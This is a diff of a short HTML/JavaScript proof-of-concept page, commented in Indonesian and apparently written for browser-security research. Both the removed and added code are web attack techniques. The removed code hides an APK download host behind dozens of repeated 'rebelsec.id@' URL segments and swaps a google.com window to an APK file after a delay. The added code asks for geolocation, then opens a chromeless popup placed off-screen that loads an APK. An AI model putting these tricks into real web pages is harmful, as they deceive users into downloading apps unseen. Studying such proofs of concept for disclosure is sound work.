@@ -1,47 +1,24 @@
-<!doctype html>
-<html>
-<head>
-  <meta charset="utf-8">
-  <title>Dual Download Buttons</title>
-  <style>
-    .button {
-      background-color: #4CAF50;
-      border: none;
-      color: white;
-      padding: 15px 32px;
-      text-align: center;
-      text-decoration: none;
-      display: inline-block;
-      font-size: 16px;
-      margin: 4px 2px;
-      cursor: pointer;
-    }
-  </style>
-</head>
-<body>
-  <center>
-    <input type="button" class="button" value="Download from frozzipies.github.io" onclick="downloadFrozzipies()">
-    <input type="button" class="button" value="Download from Rebelsec,id" onclick="downloadRebelsec()">
-  </center>
+<a href="#" onclick="poc()">click me</a>
 
 <script>
-// Fungsi umum: buka situs referer, lalu setelah delay ganti ke file apk di window bernama 'x'
-function openThenApk(refererUrl, apkUrl, delayMs = 5000) {
-  // buka referer di window bernama 'x' (akan reuse window jika sudah ada)
-  window.open(refererUrl, 'x');
-  // setelah delay, ganti lokasi window 'x' ke file apk
-  setTimeout(function() {
-    window.open(apkUrl, 'x');
-  }, delayMs);
-}
+async function poc() {
+  // 1) Minta lokasi dari halaman ini (localhost)
+  navigator.geolocation.getCurrentPosition(
+    (pos) => {
+      console.log("Lokasi OK:", pos.coords.latitude, pos.coords.longitude);
 
-function downloadFrozzipies() {
-  openThenApk('https://google.com', 'https://frozzipies.github.io/test.apk', 5000);
-}
-
-function downloadRebelsec() {
-  openThenApk('https://google.com', 'https://rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id@rebelsec.id/sample.apk', 5000);
+      // 2) Setelah user allow → baru buka window
+      window.open(
+        "https://rebelsec.id/sample.apk",
+        "qq",
+        "scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=1000,height=1000,left=-1000,top=-1000"
+      );
+    },
+    (err) => {
+      console.log("User menolak lokasi:", err);
+      // tetap boleh buka window kalau kamu mau
+      window.open("http://frozzipies.github.io/test.apk");
+    }
+  );
 }
 </script>
-</body>
-</html>
